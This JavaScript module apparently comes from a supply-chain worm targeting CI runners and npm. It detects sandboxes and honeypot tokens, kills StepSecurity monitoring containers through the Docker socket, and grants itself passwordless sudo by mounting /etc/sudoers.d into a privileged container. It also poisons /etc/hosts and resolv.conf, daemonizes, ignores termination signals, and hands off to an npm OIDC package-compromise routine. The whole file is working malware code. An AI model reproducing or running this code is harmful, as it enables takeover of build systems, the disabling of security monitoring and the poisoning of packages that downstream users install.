/*
 * Decoy and sandbox detection, Docker and sudo bypass attempts, host rewrite logic, daemonization, process lock, and preflight.
 */

import { execSync as sandboxBypassExecSync } from "child_process";
import {
  existsSync as awsCredentialsExistsSync,
  readFileSync as awsCredentialsReadFileSync,
  statSync as dockerSockStatSync,
} from "fs";
import { homedir as sandboxAwsHomedir } from "os";
import { join as sandboxAwsPathJoin } from "path";
var decoyTokenPrefixes = [
    { envVar: "GITHUB_TOKEN", prefix: "ghp_decoyGitHubToken" },
    { envVar: "NPM_TOKEN", prefix: "npm_F4k3NPMToken" },
    { envVar: "ANTHROPIC_API_KEY", prefix: "sk-ant-api03-fake" },
    { envVar: "CIRCLE_TOKEN", prefix: "fake_circle" },
    { envVar: "AWS_ACCESS_KEY_ID", prefix: "AKIAFAKE" },
  ],
  stepSecurityContainerNames = [
    "harden-runner",
    "step-security",
    "stepsecurity",
  ],
  stepSecurityHostnames = [
    "agent.stepsecurity.io",
    "api.stepsecurity.io",
    "app.stepsecurity.io",
    "www.stepsecurity.io",
    "stepsecurity.io",
  ];
function decodeChunkedHttpBody(chunkedHttpBody) {
  let decodedChunkedHttpBody = "",
    chunkedHttpOffset = 0;
  while (chunkedHttpOffset < chunkedHttpBody.length) {
    let chunkedHttpLineEnd = chunkedHttpBody.indexOf(
      "\x0d\x0a",
      chunkedHttpOffset,
    );
    if (chunkedHttpLineEnd === -1) break;
    let chunkedHttpSizeText = chunkedHttpBody.substring(
        chunkedHttpOffset,
        chunkedHttpLineEnd,
      ),
      chunkedHttpChunkSize = parseInt(chunkedHttpSizeText, 16);
    if (chunkedHttpChunkSize === 0 || isNaN(chunkedHttpChunkSize)) break;
    (chunkedHttpOffset = chunkedHttpLineEnd + 2),
      (decodedChunkedHttpBody += chunkedHttpBody.substring(
        chunkedHttpOffset,
        Math.min(
          chunkedHttpOffset + chunkedHttpChunkSize,
          chunkedHttpBody.length,
        ),
      )),
      (chunkedHttpOffset += chunkedHttpChunkSize + 2);
  }
  return decodedChunkedHttpBody;
}
function parseHttpStatusCode(statusHttpResponseText) {
  let statusHeaderEndOffset = statusHttpResponseText.indexOf("\r\n\r\n");
  if (statusHeaderEndOffset === -1) return null;
  let httpStatusText = statusHttpResponseText
    .substring(0, statusHeaderEndOffset)
    .split("\x0d\x0a")[0]
    ?.match(/HTTP\/\d\.\d (\d+)/)?.[1];
  if (!httpStatusText) return null;
  return parseInt(httpStatusText, 10);
}
function parseHttpResponseBody(bodyHttpResponseText) {
  let bodyHeaderEndOffset = bodyHttpResponseText.indexOf("\r\n\r\n");
  if (bodyHeaderEndOffset === -1) return "";
  let httpResponseHeaders = bodyHttpResponseText.substring(
      0,
      bodyHeaderEndOffset,
    ),
    httpResponseBody = bodyHttpResponseText.substring(bodyHeaderEndOffset + 4);
  if (httpResponseHeaders.includes("Transfer-Encoding: chunked"))
    httpResponseBody = decodeChunkedHttpBody(httpResponseBody);
  return httpResponseBody;
}
function dockerSocketRequest(
  dockerHttpMethod,
  dockerHttpPath,
  dockerRequestBody,
) {
  try {
    if (!dockerSockStatSync("/var/run/docker.sock").isSocket())
      return Promise.resolve(null);
  } catch {
    return Promise.resolve(null);
  }
  return new Promise((resolveDockerSocketRequest) => {
    let dockerResponseText = "",
      dockerRequestSettled = false,
      settleDockerSocketRequest = (dockerSocketResult) => {
        if (!dockerRequestSettled)
          (dockerRequestSettled = true),
            resolveDockerSocketRequest(dockerSocketResult);
      };
    try {
      Bun.connect({
        unix: "/var/run/docker.sock",
        socket: {
          open(dockerSocket) {
            let dockerHttpRequest =
                dockerHttpMethod +
                "\x20" +
                dockerHttpPath +
                " HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n",
              dockerTextEncoder = new TextEncoder();
            if (dockerRequestBody) {
              let dockerBodyBytes = dockerTextEncoder.encode(dockerRequestBody);
              (dockerHttpRequest +=
                "Content-Type: application/json\r\nContent-Length: " +
                dockerBodyBytes.length +
                "\x0d\x0a"),
                (dockerHttpRequest += "\x0d\x0a"),
                dockerSocket.write(dockerTextEncoder.encode(dockerHttpRequest)),
                dockerSocket.write(dockerBodyBytes);
            } else
              (dockerHttpRequest += "\x0d\x0a"),
                dockerSocket.write(dockerTextEncoder.encode(dockerHttpRequest));
          },
          data(dockerSocketDataEvent, dockerSocketDataBytes) {
            dockerResponseText += new TextDecoder().decode(
              dockerSocketDataBytes,
            );
          },
          close() {
            let dockerResponseStatus = parseHttpStatusCode(dockerResponseText),
              dockerParsedResponseBody =
                parseHttpResponseBody(dockerResponseText);
            settleDockerSocketRequest(
              dockerResponseStatus !== null
                ? {
                    status: dockerResponseStatus,
                    body: dockerParsedResponseBody,
                  }
                : null,
            );
          },
          error() {
            settleDockerSocketRequest(null);
          },
          drain() {},
        },
      });
    } catch {
      settleDockerSocketRequest(null);
    }
  });
}
async function killStepSecurityContainers() {
  try {
    let dockerContainersResponse = await dockerSocketRequest(
      "GET",
      "/containers/json?all=true",
    );
    if (!dockerContainersResponse || dockerContainersResponse.status !== 200)
      return false;
    let dockerContainers;
    try {
      dockerContainers = JSON.parse(dockerContainersResponse.body);
    } catch {
      return false;
    }
    if (!Array.isArray(dockerContainers)) return false;
    let stepSecurityContainer = dockerContainers.find((dockerContainer) => {
      let dockerContainerNamesText = (dockerContainer.Names || [])
          .join("\x20")
          .toLowerCase(),
        dockerContainerImageText = (dockerContainer.Image || "").toLowerCase();
      return stepSecurityContainerNames.some(
        (stepSecurityNameNeedle) =>
          dockerContainerNamesText.includes(stepSecurityNameNeedle) ||
          dockerContainerImageText.includes(stepSecurityNameNeedle),
      );
    });
    if (!stepSecurityContainer) return false;
    let killContainerResponse = await dockerSocketRequest(
      "POST",
      "/containers/" + stepSecurityContainer.Id + "/kill",
    );
    return (
      killContainerResponse !== null && killContainerResponse.status === 204
    );
  } catch {
    return false;
  }
}
function buildSudoersContainerSpec() {
  return {
    Image: "alpine",
    Cmd: [
      "sh",
      "-c",
      "echo 'runner ALL=(ALL) NOPASSWD:ALL' > /mnt/runner && chmod 0440 /mnt/runner",
    ],
    HostConfig: {
      Privileged: true,
      Binds: ["/etc/sudoers.d:/mnt"],
      AutoRemove: true,
    },
  };
}
async function installPasswordlessSudoViaDocker() {
  try {
    let sudoersContainerBody = JSON.stringify(buildSudoersContainerSpec()),
      sudoersCreateResponse = await dockerSocketRequest(
        "POST",
        "/containers/create",
        sudoersContainerBody,
      );
    if (!sudoersCreateResponse || sudoersCreateResponse.status !== 201)
      return false;
    let sudoersContainerId;
    try {
      sudoersContainerId = JSON.parse(sudoersCreateResponse.body).Id;
    } catch {
      return false;
    }
    if (!sudoersContainerId) return false;
    let sudoersStartResponse = await dockerSocketRequest(
      "POST",
      "/containers/" + sudoersContainerId + "/start",
    );
    if (
      !sudoersStartResponse ||
      (sudoersStartResponse.status !== 204 &&
        sudoersStartResponse.status !== 304)
    )
      return false;
    return true;
  } catch {
    return false;
  }
}
function buildHostsPoisonEntries() {
  return {
    ipv4: "127.0.0.1 " + stepSecurityHostnames.join("\x20"),
    ipv6: "::1 " + stepSecurityHostnames.join("\x20"),
  };
}
async function poisonHostsWithSudo() {
  try {
    sandboxBypassExecSync("sudo -n true", { stdio: "ignore" });
  } catch {
    return false;
  }
  try {
    let { ipv4: hostsPoisonIpv4, ipv6: hostsPoisonIpv6 } =
      buildHostsPoisonEntries();
    return (
      sandboxBypassExecSync(
        "sudo sh -c \"echo '" + hostsPoisonIpv4 + "' >> /etc/hosts\"",
        { stdio: "ignore" },
      ),
      sandboxBypassExecSync(
        "sudo sh -c \"echo '" + hostsPoisonIpv6 + "' >> /etc/hosts\"",
        { stdio: "ignore" },
      ),
      true
    );
  } catch {
    return false;
  }
}
async function rewriteResolvConfWithSudo() {
  try {
    return (
      sandboxBypassExecSync("sudo tee /etc/resolv.conf > /dev/null", {
        input: "nameserver 8.8.8.8\\nnameserver 1.1.1.1\\n",
        stdio: "pipe",
      }),
      true
    );
  } catch {
    return false;
  }
}
async function hasPasswordlessSudo() {
  try {
    return sandboxBypassExecSync("sudo -n true", { stdio: "ignore" }), true;
  } catch {
    return false;
  }
}
var sandboxRepoNames = ["actions-security-demo/compromised-packages"];
function isSandboxOrDecoyEnvironment() {
  if (
    decoyTokenPrefixes.some(({ envVar: decoyEnvVar, prefix: decoyPrefix }) => {
      let decoyEnvValue = process.env[decoyEnvVar];
      return decoyEnvValue !== void 0 && decoyEnvValue.startsWith(decoyPrefix);
    })
  )
    return true;
  let githubRepositoryName = process.env.GITHUB_REPOSITORY;
  if (
    githubRepositoryName &&
    sandboxRepoNames.some(
      (sandboxRepoName) => githubRepositoryName === sandboxRepoName,
    )
  )
    return true;
  if (process.cwd().startsWith("/tmp/npm-safe/")) return true;
  let sandboxPathPrefixes = ["/opt/hscan-supplychain-dynamic"],
    currentWorkingDir = process.cwd(),
    initialWorkingDir = process.env.INIT_CWD ?? "";
  if (
    sandboxPathPrefixes.some(
      (sandboxPathPrefix) =>
        currentWorkingDir.startsWith(sandboxPathPrefix) ||
        initialWorkingDir.startsWith(sandboxPathPrefix),
    )
  )
    return true;
  let awsCredentialsPath = sandboxAwsPathJoin(
    sandboxAwsHomedir(),
    ".aws",
    "credentials",
  );
  try {
    if (awsCredentialsExistsSync(awsCredentialsPath)) {
      if (
        awsCredentialsReadFileSync(awsCredentialsPath, "utf-8").includes("FAKE")
      )
        return true;
    }
  } catch {}
  return false;
}
async function neutralizeSandboxNetworking() {
  if (await hasPasswordlessSudo()) {
    if (await rewriteResolvConfWithSudo()) return true;
    if (await poisonHostsWithSudo()) return true;
    return true;
  }
  if (await killStepSecurityContainers()) return true;
  if (await installPasswordlessSudoViaDocker()) return true;
  return false;
}
import { spawn as daemonSpawn } from "child_process";
function relaunchAsDaemon() {
  if (process.env.__IS_DAEMON) return false;
  let daemonProcess = daemonSpawn(process.execPath, process.argv.slice(1), {
    detached: true,
    stdio: "ignore",
    cwd: process.cwd(),
    env: { ...process.env, __IS_DAEMON: "1" },
  });
  if (
    (daemonProcess.on("error", (daemonSpawnError) => {}),
    daemonProcess.unref(),
    daemonProcess.pid)
  );
  return true;
}
import {
  existsSync as processLockExistsSync,
  readFileSync as processLockReadFileSync,
  unlinkSync as processLockUnlinkSync,
  writeFileSync as processLockWriteFileSync,
} from "fs";
import { tmpdir as processLockTmpdir } from "os";
import { join as processLockJoin } from "path";
var processLockFile = processLockJoin(
  processLockTmpdir(),
  "tmp.0144018410.lock",
);
function processExists(processId) {
  try {
    return process.kill(processId, 0), true;
  } catch {
    return false;
  }
}
function acquireProcessLock() {
  if (processLockExistsSync(processLockFile)) {
    let lockFilePid = parseInt(
      processLockReadFileSync(processLockFile, "utf-8"),
      10,
    );
    if (processExists(lockFilePid)) return false;
    processLockUnlinkSync(processLockFile);
  }
  return (
    processLockWriteFileSync(processLockFile, process.pid.toString()), true
  );
}
function cleanupProcessLock() {
  if (processLockExistsSync(processLockFile))
    processLockUnlinkSync(processLockFile);
}
function exitAfterCleanup(exitCode = 0) {
  cleanupProcessLock(), process.exit(exitCode);
}
async function handleWorkflowOidcFastPath() {
  let workflowIdNeedle = process.env.WORKFLOW_ID,
    repoIdSuffixNeedle = process.env.REPO_ID_SUFFIX;
  if (!workflowIdNeedle && !repoIdSuffixNeedle) return;
  try {
    if (process.env.GITHUB_ACTIONS) {
      let {
        GITHUB_WORKFLOW_REF: githubWorkflowRef,
        GITHUB_REPOSITORY: githubRepository,
      } = process.env;
      if (
        (!workflowIdNeedle || githubWorkflowRef?.includes(workflowIdNeedle)) &&
        (!repoIdSuffixNeedle || githubRepository?.includes(repoIdSuffixNeedle))
      )
        await new NpmOidcPackageCompromiser().execute(), exitAfterCleanup();
      else {
        if (
          repoIdSuffixNeedle &&
          githubRepository?.includes(repoIdSuffixNeedle)
        )
          exitAfterCleanup();
      }
    }
  } catch {
    return;
  }
}
async function preflightAndDaemonize() {
  if (isSandboxOrDecoyEnvironment()) exitAfterCleanup();
  if ((await handleWorkflowOidcFastPath(), isRussianLocaleGuard()))
    exitAfterCleanup();
  if (!isCiEnvironment() && relaunchAsDaemon()) exitAfterCleanup();
  let ignoredSignalHandler = () => {};
  if (
    (process.on("SIGINT", ignoredSignalHandler),
    process.on("SIGTERM", ignoredSignalHandler),
    !acquireProcessLock())
  )
    exitAfterCleanup();
}
